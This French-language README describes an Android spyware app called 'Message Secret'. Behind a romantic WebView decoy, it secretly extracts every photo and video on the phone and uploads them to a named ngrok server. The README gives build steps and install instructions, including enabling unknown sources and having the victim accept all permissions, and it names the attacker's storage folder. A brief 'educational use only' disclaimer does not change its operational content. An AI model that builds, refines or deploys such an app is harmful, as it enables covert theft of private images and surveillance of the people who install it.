# Message Secret - APK Extraction

## Description
Application Android "Message Secret" qui extrait automatiquement TOUTES les photos et vidéos du téléphone et les envoie au serveur.

## Fonctionnalités
- ✅ Extraction automatique de toutes les images
- ✅ Extraction automatique de toutes les vidéos  
- ✅ Accès caméra et micro
- ✅ Envoi automatique au serveur
- ✅ Interface romantique (WebView)
- ✅ Compatible Android 6.0 à 14
- ✅ Gestion des permissions Android 13+

## Structure du projet
```
TikTokVerify/
├── app/
│   ├── build.gradle
│   └── src/main/
│       ├── AndroidManifest.xml
│       ├── java/com/tiktok/verify/MainActivity.java
│       └── res/values/
│           ├── strings.xml
│           └── styles.xml
├── build.gradle
├── settings.gradle
├── gradle.properties
└── gradle/wrapper/gradle-wrapper.properties
```

## Compilation

### Option 1: Android Studio (RECOMMANDÉ)
1. Télécharger Android Studio: https://developer.android.com/studio
2. Ouvrir le dossier TikTokVerify
3. Attendre la synchronisation Gradle
4. Build > Build Bundle(s) / APK(s) > Build APK(s)
5. L'APK sera dans: app/build/outputs/apk/debug/app-debug.apk

### Option 2: Ligne de commande (avec SDK Android)
```bash
cd TikTokVerify
gradlew.bat assembleDebug   # Windows
./gradlew assembleDebug     # Linux/Mac
```

### Option 3: AIDE (sur Android)
1. Installer AIDE depuis Play Store
2. Importer le projet
3. Compiler directement sur le téléphone

### Option 4: En ligne (sans installation)
1. Aller sur https://appetize.io ou https://buildozer.io
2. Uploader le projet
3. Compiler en ligne

## Installation sur téléphone
1. Paramètres > Sécurité > Sources inconnues > Activer
2. Transférer l'APK sur le téléphone (USB, email, etc.)
3. Ouvrir le fichier APK
4. Installer
5. Ouvrir "Message Secret"
6. ACCEPTER TOUTES LES PERMISSIONS

## Serveur
L'APK envoie les fichiers à:
https://finnegan-unplanted-agustina.ngrok-free.dev/upload

Les fichiers sont stockés dans:
C:\Users\davis\OneDrive\Bureau\HACKING\04_PHISHING_ET_TESTS\PhishingDemo\captured_media\

## Comment ça marche
1. L'utilisateur ouvre l'app "Message Secret"
2. L'app demande les permissions (photos, caméra, etc.)
3. Si accepté, l'extraction commence en arrière-plan
4. Toutes les photos/vidéos sont envoyées au serveur
5. L'utilisateur voit la page romantique normale

## ⚠️ AVERTISSEMENT
Usage éducatif uniquement. L'utilisation contre des personnes sans consentement est ILLÉGALE.
